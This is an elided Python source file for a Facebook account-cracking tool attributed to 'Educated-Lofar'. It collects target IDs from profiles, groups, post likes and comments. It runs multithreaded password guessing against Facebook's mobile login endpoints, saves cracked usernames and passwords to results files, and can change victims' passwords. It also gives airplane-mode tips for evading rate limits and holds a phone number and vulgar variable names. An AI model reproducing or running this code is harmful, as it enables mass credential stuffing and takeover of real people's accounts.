# code by Educated-Lofar 
# my facebook ( https://www.facebook.com/educated lofar )

#      (C) Copyright 407 Authentic Exploit
#      Rebuild Copyright Can't make u real programmer:)
#      Coded By Educated-Lofar.
...
from concurrent.futures import ThreadPoolExecutor as Educated-LofarGanteng
...
def logo():
    print(f"""{M}
     ...
     ██╔══╝     ██║    ██║  ██║   ██║   ██║            ██╔══██║       ██║       ██╔══╝       ██║     ██║           ██║             ██║      ██║  ██╔══╝     ██╔══██║██╔══██╗    
     ███████╗██████╔╝ ╚██████╔╝╚██████╗██║     ██║       ██║       ███████╗  ██████╔╝           ███████╗╚██████╔╝ ██║            ██║    ██║██║      ██║    
      ╚══════╝╚═════╝      ╚═════╝     ╚═════╝╚═╝     ╚═╝       ╚═╝       ╚══════╝  ╚═════╝             ╚══════╝    ╚═════╝  ╚═╝             ╚═╝    ╚═╝ ╚═╝   ╚═╝\n{N} ▌│█║▌║▌║EDUCATED LOFAR METHOD║▌║▌║█│▌{N} """)
    print("╔════════════════════════════════════════╗")
    print(f"║{P}[{H}•{P}] Author    : Educated Lofar             {N}║")
    print(f"║{P}[{H}•{P}] Whatsapp  : +923484643371           {N}║")
    print(f"║{P}[{H}•{P}] Github    : github.com/Educated-Lofar-ID/meta{N}  ║")
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCRACK BY Educated-Lofar META SC SELESAI...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}user123{N}")
            ...
            for memek in cp:
                ...
                titid  = kontol.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{kontol.replace("[Educated-Lofar] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[Educated-Lofar] ", ""), titid[1])
...
def cek_pw():
    try:
        ...
        if pil =="":
            ...
            os.system('xdg-open https://wa.me/923484643371?text=Hallo+izin+menggunakan+SC+ini');time.sleep(2);cek_pw()
        elif pil in["1","01"]:
            print('%s══════════════════════════════════════════'%(N))
...
def kska():
    ...
    if xx in[""]:
        ...
        jalan(" %s[%s✓%s] OK Password is correct"%(N,H,N));time.sleep(2);open(".ini_pw.txt", "a").write(xx);moch_Educated-Lofar()
    else:
        jalan(" %s[%s!%s] Sorry, wrong Password"%(N,M,N));time.sleep(1);cek_pw()

#METODE LOGIN
def Educated-Lofarxd():
    os.system('clear')
    logo()
    r=requests.Session()
    ...
    if p =="":
        print(f"\n {N}[{M}!{N}] Dont be empty");time.sleep(3);Educated-Lofarxd()
    elif p in["1","01"]:
        login_token()
    elif p in["2","02"]:
        login_cookie()
...
def login_token():
    ...
    try:
        ...
        os.system('xdg-open https://wa.me/923484643371?text=Hallo+izin+menggunakan+SC+ini')
        moch_Educated-Lofar()
    except (AttributeError,KeyError):
        jalan(f"\n {N}[{M}!{N}] Sign in token {M}Vailed{N}");Educated-Lofarxd()
    except UnboundLocalError:
        jalan(f"\n {N}[{M}!{N}] Sign in token {M}Vailed{N}");Educated-Lofarxd()
    except requests.exceptions.ConnectionError:
        jalan(f"\n {N}[{M}!{N}] Sorry No connection");Educated-Lofarxd()
# ------- LOGIN COOKIE --------
def login_cookie():
    ...
    try:
        ...
        jalan('\n %s[%s×%s] Sign in Cookie %sVailed%s'%(N,M,N,M,N));time.sleep(1);Educated-Lofarxd()
    except UnboundLocalError:
        jalan('\n %s[%s×%s] Sign in Cookie %sVailed%s'%(N,M,N,M,N));time.sleep(1);Educated-Lofarxd()
    except requests.exceptions.ConnectionError:
        jalan('\n %s[%s!%s] Sorry No connection'%(N,M,N));time.sleep(1);Educated-Lofarxd()
#LOGIN PASSWORD
def login_passwod():
    ...
    try:
        ...
        if 'c_user' in session.cookies.get_dict():
            ...
            jalan(f"\n [{M}×{N}] Sign in Cookie {M}Vailed{N}");Educated-Lofarxd()
    except (AttributeError,KeyError):
        jalan(f"\n [{M}×{N}] Sign in Cookie {M}Vailed{N}");Educated-Lofarxd()
    except UnboundLocalError:
        jalan(f"\n [{M}×{N}] Sign in Cookie {M}Vailed{N}");Educated-Lofarxd()
...
def convert_cookietotoken():
  try:
      ...
      loading()
      if len(cookie) == 0:
        jalan(f" {N}[{M}!{N}] Don't be empty");Educated-Lofarxd()
      else:
...
### MENU UTAMA ###
def moch_Educated-Lofar():
    os.system('clear')
    logo()
    try:
        tokenz = open('.token.txt', 'r').read()
    except IOError:
        print('\n %s[%s×%s] Cookie/Token expired'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');Educated-Lofarxd()
    try:
        xx = requests.get('https://graph.facebook.com/me?access_token=%s'%(tokenz)).json()
        nama = xx['name']
        idfb = xx['id']
    except KeyError:
        print('\n %s[%s×%s] Sorry, Cookie/Token invalid'%(N,M,N));time.sleep(2);os.system('rm -rf .token.txt');os.system('rm -rf .cokie.txt');Educated-Lofarxd()
    except requests.exceptions.ConnectionError:
    ...
    if pepek == '':
        jalan('\n %s[%s×%s] Sorry the menu selection is wrong...!'%(N,M,N));time.sleep(2);moch_Educated-Lofar()
###### CRACK ID PUBLIK SINGEL #####
        ...
        try:
            ...
            jalan(f' %s[%s×%s] Sorry %sID is not public/Invalid token%s'%(N,M,N,M,N));time.sleep(1);moch_Educated-Lofar()
...
###### CRACK GRUP #####
            ...
            if kontol in[""," "]:
                print('\n %s[%s×%s] Dont be empty...!'%(N,M,N));time.sleep(2);moch_Educated-Lofar()
            else:
                try:
                    cookiz = open('.cokie.txt').read()
                    kueh  = {"cookie":cookiz}
                except IOError:
                    jalan(f"\n [{M}×{N}] You login using a token, if you want to crack from a group member, please login cookies first");time.sleep(5);os.system('rm -rf .token.txt');Educated-Lofarxd()
                try:
                    a = requests.get(f"https://graph.facebook.com/group/?id={kontol}&access_token={tokenz}").json()["name"]
                    if "Halaman Tidak Ditemukan" in a:
                        print(f"\n %s[%s×%s] Group with ID {kontol} not found"%(N,M,N));time.sleep(2);moch_Educated-Lofar()
                    elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in a:
                        print("\n %s[%s×%s] Facebook restricts every activity, account is spammed, please switch accounts"%(N,M,N));time.sleep(2);moch_Educated-Lofar()
...
###### CRACK LIKE POSTINGAN #####
            ...
            try:
                ...
                jalan(f"\n {N}[{M}×{N}] You login using a token, if you want to crack from a group member, please login cookies first");time.sleep(5);os.system('rm -rf .token.txt');Educated-Lofarxd()
            try:
                print(f"\n {N}[{M}!{N}] To stop {H}CTRL+c{N} on keyboard")
                like_post(f"https://mbasic.facebook.com/ufi/reaction/profile/browser/?ft_ent_identifier={kontol}", kueh)
            except KeyError:
                print(f"\n [!] Post with ID {kontol} not found");time.sleep(2);moch_Educated-Lofar()
###### CRACK KOMENTAR #####
    elif pepek in['5','05']:
...
###### CEK HASIL CRACK #####
        ...
        for memek in total:
            kontol = memek.replace("\n","")
            titid  = kontol.replace("[Educated-Lofar-OK] ","\x1b[1;92m[Educated-Lofar-OK] ").replace("[Educated-Lofar] ", "\x1b[1;93m[Educated-Lofar] ")
            print("%s%s"%(titid,N));time.sleep(0.03)
        jalan("\n %s[%s✓%s] File check complete..."%(N,H,N))
        input(' [%sPRESS ENTER%s] to continue'%(H,N));moch_Educated-Lofar()
###### INFO UPDATE & UPGRADE SC #####
    elif pepek in['8','08']:
        print("%s══════════════════════════════════════════"%(N))
        jalan(f" {BM}{P}SC INFO{N}\n [{H}•{N}] Author SC : {K}R O Y\n {N}[{H}•{N}] Whatsapp : {K}+923484643371\n {N}[{H}•{N}] Github : {K}https://github.com/Educated-Lofar-ID\n {N}[{H}•{N}] Status SC : Gratis rasa {H}Premium{N}\n\n {BM}{P}SOURC CODE{N}\n [{H}1{N}] Educated-LofarXD      [{H}2{N}] Romi\n [{H}3{N}] RozhakXD     [{H}4{N}] Siapa lagi?\n\n {BM}FIX BUG{N}\n [{H}✓{N}] Terjadinya Error saat memainkan mode pesawat saat proses crack sedang berjalan, kini sudah diperbaiki dan sudah bisa dimainkan mode pesawat saat proses crack sedang berjalan\n [{H}✓{N}] Sedikit perubahan warna text dan tampilan SC\n [{H}✓{N}] Perubahan user agent bawaan SC\n [{H}✓{N}] Penambahan menampilkan {H}Web & Aplikasi AKTIF{N}")
        upd = input('\n %s[%s?%s] Send direct message to Author [%sY%s/%st%s] : '%(N,K,N,H,N,M,N))
        if upd =="":
            exit(f"{N}[{M}×{N}] Sorry, it is wrong...!")
        elif upd in["Y","y"]:
...
###### HAPUS COOKIE #####
        ...
        jalan('\n %s[%s×%s] Sorry menu [%s%s%s] moderate improvement...!'%(N,M,N,M,pepek,N));time.sleep(2);moch_Educated-Lofar()
...
def gabut():
    ...
    try:
        ...
        print('\n [!] Sorry, the file doesnt exist');time.sleep(2);moch_Educated-Lofar()
    ww=input(f"{N}══════════════════════════════════════════\n [{M}!{N}] Play airplanemode first.\n══════════════════════════════════════════\n {N}[{K}?{N}] Change password when {BM}TAP YES{N} [{H}Y{N}/{M}t{N}]: {K}")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f"\n {N}[{H}•{N}] Password example : {H}user123{N}")
    ...
    if "c_user" in session.cookies.get_dict():
        ...
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                ...
                open('results/ERROR.txt', 'a').write(f"[Educated-Lofar] {user} • {pasw}\n")
                print(f" {N}[{M}!{N}] Error")
        else:
            open(f'results/CP-DETEKTOR-{ha}-{op}-{ta}.txt', 'a').write(f"[Educated-Lofar] {user} • {pasw}\n")
        ...
        open('results/INVALID-OK.txt', 'a').write(f"[Educated-Lofar] {user} • {pasw}\n")
#UBAH PW
...
# METODE SANDI MANUAL
    def plerr(self,id):
        ...
        ___Educated-Lofarganteng___ = input('%s══════════════════════════════════════════\n [%s?%s] Enter SC Password (%srequired%s) : %s'%(N,K,N,H,N,H))
        if ___Educated-Lofarganteng___ in ('raraY', 'raray'):
            self.tampilkan_apk()
            print('%s══════════════════════════════════════════\n %sMANUAL PASSWORD DETAILS%s'%(N,BM,N))
            print(' %s[%s!%s] Use %sKOMMA%s for separator\n [%s•%s] Example : %sEducated-Lofar123%s,%ssayang%s,%sbismillah'%(N,M,N,H,N,H,N,H,N,H,N,H))
            while True:
                ...
                if pwek == '':
                    ...
                    def __yan__(ysc=None): # ycs => Educated-Lofar sayang Cindy:3
                        ...
                        if cin == '':
                            ...
                            with Educated-LofarGanteng(max_workers=30) as (__Educated-LofarXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __Educated-LofarXD__.submit(self.__metode__, kimochi, ysc, "free.facebook.com")
                                    except: pass
                            ...
                            with Educated-LofarGanteng(max_workers=30) as (__Educated-LofarXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __Educated-LofarXD__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                    except: pass
                    ...
                    __yan__(pwek.split(','))
                    break
        elif ___Educated-Lofarganteng___ in ('METAEducated-LofarID', 'MetaEducated-Lofarid', 'metaEducated-Lofarid'):
            self.tampilkan_apk()
            mentod()
            self.__pler__()
        else:
...
# PROSES CRACK METODE 3 in 1
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    if "t" in Apk:
                        ...
                        print(f'\r {H}Cookie   : {coki}')
                    wrt = '[Educated-Lofar-OK] %s • %s' % (user,pw)
                    ok.append(wrt)
                    cek_apk(session,coki)
                    ...
                    try:
                        ...
                        wrt = '[Educated-Lofar] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                    ...
                    print('\r %sMETA LIVE CP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
                    wrt = '[Educated-Lofar] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
    ...
    def kombinasi_pw(self,url):
        ...
        if pw in[""]:
            ...
            print(' %s[%s+%s] CP : results/CP-%s-%s-%s.txt'%(N,K,N,ha, op, ta))
            print('%s══════════════════════════════════════════\n [%s!%s] Must activate airplanemode on ID 30\n [%s!%s] Play back airplanemode every 500 ID\n [%s!%s] To stop %sCTRL+c%s on keyboard\n══════════════════════════════════════════'%(N,M,N,M,N,M,N,H,N))
            with Educated-LofarGanteng(max_workers=35) as kirim:
